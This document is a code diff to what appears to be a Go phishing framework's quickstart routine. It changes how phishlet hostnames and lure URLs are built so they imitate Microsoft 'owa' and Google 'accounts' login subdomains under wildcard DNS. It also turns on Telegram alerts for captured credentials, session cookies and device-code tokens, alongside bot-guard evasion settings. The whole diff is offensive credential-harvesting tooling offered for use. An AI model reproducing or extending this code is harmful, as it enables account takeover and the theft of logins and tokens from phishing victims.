@@ -309,17 +309,9 @@ func (t *Terminal) handleQuickstart(args []string) error {
 	}
 	t.p.botguard.SetMinTrustScore(t.cfg.GetBotguardMinTrustScore())
 
-	// 5. Set phishlet hostname
+	// 5. Set phishlet hostname (use base domain so wildcard *.domain.com works)
 	log.Info("[5/7] configuring phishlet: %s", phishlet)
-	var hostname string
-	switch phishlet {
-	case "o365":
-		hostname = "login." + domain
-	case "google":
-		hostname = "accounts." + domain
-	default:
-		hostname = phishlet + "." + domain
-	}
+	hostname := domain // Use base domain - wildcard DNS *.domain.com covers owa.domain.com, secure.domain.com, etc.
 	t.cfg.SetSiteHostname(phishlet, hostname)
 
 	// 6. Enable phishlet
@@ -337,10 +329,16 @@ func (t *Terminal) handleQuickstart(args []string) error {
 	lureID := len(t.cfg.lures) - 1
 	log.Info("lure ID: %d", lureID)
 
-	// Get the lure URL
+	// Get the lure URL - use the landing subdomain from phishlet
 	pl, plErr := t.cfg.GetPhishlet(phishlet)
 	if plErr == nil {
-		lureURL := fmt.Sprintf("https://%s%s", hostname, l.Path)
+		// Get landing subdomain from phishlet's proxy_hosts
+		landingSub := "owa" // default for o365
+		if phishlet == "google" {
+			landingSub = "accounts"
+		}
+		lureHost := landingSub + "." + hostname
+		lureURL := fmt.Sprintf("https://%s%s", lureHost, l.Path)
 		_ = pl
 		log.Success("lure URL: %s", lureURL)
 	}
@@ -365,6 +363,7 @@ func (t *Terminal) handleQuickstart(args []string) error {
 			n.Enabled = true
 			n.Triggers[EventCredentialCaptured] = true
 			n.Triggers[EventSessionCaptured] = true
+			n.Triggers[EventDeviceCodeCaptured] = true // Send device code tokens to Telegram
 			t.cfg.AddNotifier(n)
 			log.Success("telegram notifications configured!")
 		}
